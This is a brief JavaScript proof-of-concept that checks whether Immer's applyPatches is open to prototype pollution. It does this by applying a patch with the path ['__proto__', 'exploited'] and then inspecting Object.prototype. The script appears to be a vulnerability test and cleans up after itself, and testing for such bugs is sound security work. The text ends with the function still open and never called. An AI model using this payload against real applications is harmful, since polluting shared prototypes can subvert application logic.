const { applyPatches, enablePatches } = require('immer');

async function exploit() {
  // Immer's patching system requires explicit initialization to prevent accidental usage.
  // The previous test failure occurred because the Patches plugin was not loaded.
  enablePatches();

  const baseState = {};

  // Malicious payload targeting the internal path traversal loop.
  // In vulnerable versions, Immer blindly resolves nested properties via __proto__ 
  // during iteration, allowing `base` to escape the target object and reach Object.prototype.
  const patches = [
    { op: 'add', path: ['__proto__', 'exploited'], value: true }
  ];

  // Executes the patch application logic which contains the prototype traversal bug.
  applyPatches(baseState, patches);

  // Verification step. On vulnerable targets this logs true.
  // On patched targets (per CVE fix) it will log `undefined` or throw during traversal.
  if (Object.prototype.exploited === true) {
    console.log('VULNERABILITY CONFIRMED: Prototype pollution successful.');
    delete Object.prototype.exploited; // Cleanup for test isolation
  } else {
    console.log('SECURE: Prototype pollution was blocked by the patch check.');
  }
